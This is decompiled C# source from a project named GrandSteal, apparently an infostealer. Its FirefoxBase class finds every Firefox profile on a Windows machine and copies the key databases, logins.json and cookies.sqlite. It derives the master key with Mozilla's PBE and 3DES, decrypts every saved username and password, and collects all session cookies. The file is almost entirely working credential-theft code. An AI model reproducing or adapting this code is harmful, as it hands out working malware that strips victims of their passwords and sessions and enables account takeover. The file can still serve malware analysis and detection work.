using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using GrandSteal.Client.Data.Firefox;
using GrandSteal.Client.Data.SQLite;
using GrandSteal.Client.Models.Credentials;
using GrandSteal.Client.Models.Extensions.Json;
using GrandSteal.Client.Models.Extensions.Nulls;
using GrandSteal.SharedModels.Models;

namespace GrandSteal.Client.Data.Recovery
{
	// Token: 0x02000020 RID: 32
	public class FirefoxBase : ICredentialsManager<BrowserProfile>
	{
		// Token: 0x060000E2 RID: 226 RVA: 0x00006D58 File Offset: 0x00004F58
		public IEnumerable<BrowserProfile> GetAll()
		{
			List<BrowserProfile> list = new List<BrowserProfile>();
			try
			{
				foreach (string text in FirefoxBase.ExtractProfiles())
				{
					BrowserProfile browserProfile = new BrowserProfile
					{
						Name = "Firefox",
						Profile = new DirectoryInfo(text).Name,
						BrowserCookies = new List<BrowserCookie>(FirefoxBase.ExtractCookies(text)).IsNull<List<BrowserCookie>>(),
						BrowserCredendtials = new List<BrowserCredendtial>(FirefoxBase.ExtractCredentials(text).IsNull<IEnumerable<BrowserCredendtial>>()).IsNull<List<BrowserCredendtial>>()
					};
					if (browserProfile.BrowserCookies.Count((BrowserCookie x) => x.IsNotNull<BrowserCookie>()) <= 0)
					{
						if (browserProfile.BrowserCredendtials.Count((BrowserCredendtial x) => x.IsNotNull<BrowserCredendtial>()) <= 0)
						{
							Console.WriteLine("Profile is empty: " + browserProfile);
							continue;
						}
					}
					list.Add(browserProfile);
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return list;
		}

		// Token: 0x060000E3 RID: 227 RVA: 0x00006E88 File Offset: 0x00005088
		public static IEnumerable<BrowserCredendtial> ExtractCredentials(string profile)
		{
			List<BrowserCredendtial> list = new List<BrowserCredendtial>();
			try
			{
				if (File.Exists(Path.Combine(profile, "key3.db")))
				{
					list.AddRange(FirefoxBase.ExtractLogins(profile, FirefoxBase.ExtractPrivateKey3(ChromiumManager.CreateTempCopy(Path.Combine(profile, "key3.db")))));
				}
				if (File.Exists(Path.Combine(profile, "key4.db")))
				{
					list.AddRange(FirefoxBase.ExtractLogins(profile, FirefoxBase.ExtractPrivateKey4(ChromiumManager.CreateTempCopy(Path.Combine(profile, "key4.db")))));
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return list;
		}

		// Token: 0x060000E4 RID: 228 RVA: 0x00006F1C File Offset: 0x0000511C
		public static IEnumerable<BrowserCookie> ExtractCookies(string profile)
		{
			List<BrowserCookie> list = new List<BrowserCookie>();
			try
			{
				string text = Path.Combine(profile, "cookies.sqlite");
				if (!File.Exists(text))
				{
					return list;
				}
				SQLiteManager sqliteManager = new SQLiteManager(ChromiumManager.CreateTempCopy(text));
				Console.WriteLine(sqliteManager.ReadTable("moz_cookies"));
				for (int i = 0; i < sqliteManager.GetRowCount(); i++)
				{
					BrowserCookie browserCookie = null;
					try
					{
						browserCookie = new BrowserCookie
						{
							Host = sqliteManager.GetValue(i, "host").Trim(),
							Http = (sqliteManager.GetValue(i, "isSecure") == "1"),
							Path = sqliteManager.GetValue(i, "path").Trim(),
							Secure = (sqliteManager.GetValue(i, "isSecure") == "1"),
							Expires = sqliteManager.GetValue(i, "expiry").Trim(),
							Name = sqliteManager.GetValue(i, "name").Trim(),
							Value = sqliteManager.GetValue(i, "value")
						};
					}
					catch
					{
					}
					if (browserCookie != null)
					{
						list.Add(browserCookie);
						Console.WriteLine(browserCookie);
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return list;
		}

		// Token: 0x060000E5 RID: 229 RVA: 0x00007090 File Offset: 0x00005290
		private static IEnumerable<BrowserCredendtial> ExtractLogins(string profile, byte[] privateKey)
		{
			List<BrowserCredendtial> list = new List<BrowserCredendtial>();
			try
			{
				string path = ChromiumManager.CreateTempCopy(Path.Combine(profile, "logins.json"));
				if (!File.Exists(path))
				{
					return list;
				}
				RootLogin rootLogin = File.ReadAllText(path).FromJSON<RootLogin>();
				Asn1Der asn1Der = new Asn1Der();
				foreach (LoginJson loginJson in rootLogin.logins)
				{
					Asn1DerObject asn1DerObject = asn1Der.Parse(Convert.FromBase64String(loginJson.encryptedUsername));
					Asn1DerObject asn1DerObject2 = asn1Der.Parse(Convert.FromBase64String(loginJson.encryptedPassword));
					string text = Regex.Replace(TripleDESHelper.DESCBCDecryptor(privateKey, asn1DerObject.objects[0].objects[1].objects[1].Data, asn1DerObject.objects[0].objects[2].Data, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
					string text2 = Regex.Replace(TripleDESHelper.DESCBCDecryptor(privateKey, asn1DerObject2.objects[0].objects[1].objects[1].Data, asn1DerObject2.objects[0].objects[2].Data, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
					BrowserCredendtial browserCredendtial = new BrowserCredendtial
					{
						URL = (string.IsNullOrEmpty(loginJson.hostname) ? "UNKNOWN" : loginJson.hostname),
						Login = (string.IsNullOrEmpty(text) ? "UNKNOWN" : text),
						Password = (string.IsNullOrEmpty(text2) ? "UNKNOWN" : text2)
					};
					if (browserCredendtial.Login != "UNKNOWN" && browserCredendtial.Password != "UNKNOWN" && browserCredendtial.URL != "UNKNOWN")
					{
						list.Add(browserCredendtial);
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return list;
		}

		// Token: 0x060000E6 RID: 230 RVA: 0x000072A0 File Offset: 0x000054A0
		private static string CalcHex(byte[] input)
		{
			string text = string.Empty;
			foreach (char c in BitConverter.ToString(input).Replace("-", string.Empty))
			{
				if (char.IsLetter(c))
				{
					text += char.ToLower(c).ToString();
				}
				else
				{
					text += c.ToString();
				}
			}
			return text;
		}

		// Token: 0x060000E7 RID: 231 RVA: 0x00002691 File Offset: 0x00000891
		private static string CalcHex(string input)
		{
			return FirefoxBase.CalcHex(Encoding.Default.GetBytes(input));
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x00007314 File Offset: 0x00005514
		private static byte[] ExtractPrivateKey4(string file)
		{
			byte[] array = new byte[24];
			try
			{
				Console.WriteLine("Key source file: " + file);
				if (!File.Exists(file))
				{
					Console.WriteLine("Source file UNKNOWN");
					return array;
				}
				SQLiteManager sqliteManager = new SQLiteManager(file);
				sqliteManager.ReadTable("metaData");
				string value = sqliteManager.GetValue(0, "item1");
				string value2 = sqliteManager.GetValue(0, "item2)");
				Asn1DerObject asn1DerObject = new Asn1Der().Parse(Encoding.Default.GetBytes(value2));
				byte[] data = asn1DerObject.objects[0].objects[0].objects[1].objects[0].Data;
				byte[] data2 = asn1DerObject.objects[0].objects[1].Data;
				MozillaPBE mozillaPBE = new MozillaPBE(Encoding.Default.GetBytes(value), Encoding.Default.GetBytes(string.Empty), data);
				mozillaPBE.Compute();
				string input = TripleDESHelper.DESCBCDecryptor(mozillaPBE.Key, mozillaPBE.IV, data2, PaddingMode.None);
				Console.WriteLine(new string('=', 20));
				Console.WriteLine("Global salt found for encrypt: [" + FirefoxBase.CalcHex(value) + "]");
				Console.WriteLine("Entry salt found for encrypt: [" + FirefoxBase.CalcHex(data) + "]");
				Console.WriteLine("СheckPwd key for encrypt : [" + FirefoxBase.CalcHex(mozillaPBE.Key) + "]");
				Console.WriteLine("СheckPwd IV for encrypt: [" + FirefoxBase.CalcHex(mozillaPBE.IV) + "]");
				Console.WriteLine("Decrypted chiper: [" + FirefoxBase.CalcHex(input) + "]");
				Console.WriteLine(new string('=', 20));
				sqliteManager.ReadTable("nssPrivate");
				int rowCount = sqliteManager.GetRowCount();
				string s = string.Empty;
				for (int i = 0; i < rowCount; i++)
				{
					if (sqliteManager.GetValue(i, "a102") == Encoding.Default.GetString(FirefoxBase.MagicNumber1))
					{
						s = sqliteManager.GetValue(i, "a11");
						break;
					}
				}
				Asn1DerObject asn1DerObject2 = new Asn1Der().Parse(Encoding.Default.GetBytes(s));
				data = asn1DerObject2.objects[0].objects[0].objects[1].objects[0].Data;
				data2 = asn1DerObject2.objects[0].objects[1].Data;
				mozillaPBE = new MozillaPBE(Encoding.Default.GetBytes(value), Encoding.Default.GetBytes(string.Empty), data);
				mozillaPBE.Compute();
				Console.WriteLine(new string('=', 20));
				Console.WriteLine("ChiperT found after encrypt: [" + FirefoxBase.CalcHex(data2) + "]");
				Console.WriteLine("Global salt found after encrypt: [" + FirefoxBase.CalcHex(value) + "]");
				Console.WriteLine("Entry salt found after encrypt: [" + FirefoxBase.CalcHex(data) + "]");
				Console.WriteLine("СheckPwd key after encrypt : [" + FirefoxBase.CalcHex(mozillaPBE.Key) + "]");
				Console.WriteLine("СheckPwd IV after encrypt: [" + FirefoxBase.CalcHex(mozillaPBE.IV) + "]");
				array = Encoding.Default.GetBytes(TripleDESHelper.DESCBCDecryptor(mozillaPBE.Key, mozillaPBE.IV, data2, PaddingMode.PKCS7));
				Console.WriteLine("Decrypted private key: [" + FirefoxBase.CalcHex(array) + "]");
				Console.WriteLine(new string('=', 20));
			}
			catch (Exception value3)
			{
				Console.WriteLine(value3);
			}
			return array;
		}

		// Token: 0x060000E9 RID: 233 RVA: 0x000076D8 File Offset: 0x000058D8
		private static byte[] ExtractPrivateKey3(string file)
		{
			byte[] array = new byte[24];
			try
			{
				Console.WriteLine("Key source file: " + file);
				if (!File.Exists(file))
				{
					Console.WriteLine("Source file UNKNOWN");
					return array;
				}
				new DataTable();
				Asn1Der asn1Der = new Asn1Der();
				BerkeleyDB berkeleyDB = new BerkeleyDB(file);
				PasswordCheck passwordCheck = new PasswordCheck(FirefoxBase.FindValueByKey(berkeleyDB, (string x) => x.Equals("password-check")));
				string hexString = FirefoxBase.FindValueByKey(berkeleyDB, (string x) => x.Equals("global-salt"));
				MozillaPBE mozillaPBE = new MozillaPBE(ByteHelper.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), ByteHelper.ConvertHexStringToByteArray(passwordCheck.EntrySalt));
				mozillaPBE.Compute();
				TripleDESHelper.DESCBCDecryptor(mozillaPBE.Key, mozillaPBE.IV, ByteHelper.ConvertHexStringToByteArray(passwordCheck.Passwordcheck), PaddingMode.None);
				string hexString2 = FirefoxBase.FindValueByKey(berkeleyDB, (string x) => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt"));
				Asn1DerObject asn1DerObject = asn1Der.Parse(ByteHelper.ConvertHexStringToByteArray(hexString2));
				MozillaPBE mozillaPBE2 = new MozillaPBE(ByteHelper.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), asn1DerObject.objects[0].objects[0].objects[1].objects[0].Data);
				mozillaPBE2.Compute();
				byte[] bytes = Encoding.Default.GetBytes(TripleDESHelper.DESCBCDecryptor(mozillaPBE2.Key, mozillaPBE2.IV, asn1DerObject.objects[0].objects[1].Data, PaddingMode.None));
				Asn1DerObject asn1DerObject2 = asn1Der.Parse(bytes);
				Asn1DerObject asn1DerObject3 = asn1Der.Parse(asn1DerObject2.objects[0].objects[2].Data);
				if (asn1DerObject3.objects[0].objects[3].Data.Length > 24)
				{
					Array.Copy(asn1DerObject3.objects[0].objects[3].Data, asn1DerObject3.objects[0].objects[3].Data.Length - 24, array, 0, 24);
				}
				else
				{
					array = asn1DerObject3.objects[0].objects[3].Data;
				}
			}
			catch
			{
			}
			return array;
		}

		// Token: 0x060000EA RID: 234 RVA: 0x0000796C File Offset: 0x00005B6C
		private static string FindValueByKey(BerkeleyDB berkeleyDB, System.Func<string, bool> predicate)
		{
			string text = string.Empty;
			try
			{
				foreach (KeyValuePair<string, string> keyValuePair in berkeleyDB.Keys)
				{
					if (predicate(keyValuePair.Key))
					{
						text = keyValuePair.Value;
					}
				}
			}
			catch
			{
			}
			return text.Replace("-", string.Empty);
		}

		// Token: 0x060000EB RID: 235 RVA: 0x000079F8 File Offset: 0x00005BF8
		private static IEnumerable<string> ExtractProfiles()
		{
			List<string> list = new List<string>();
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
				if (!Directory.Exists(path))
				{
					return list;
				}
				list.AddRange(Directory.GetDirectories(path));
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x04000063 RID: 99
		private static readonly byte[] MagicNumber1 = new byte[]
		{
			248,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			1
		};
	}
}
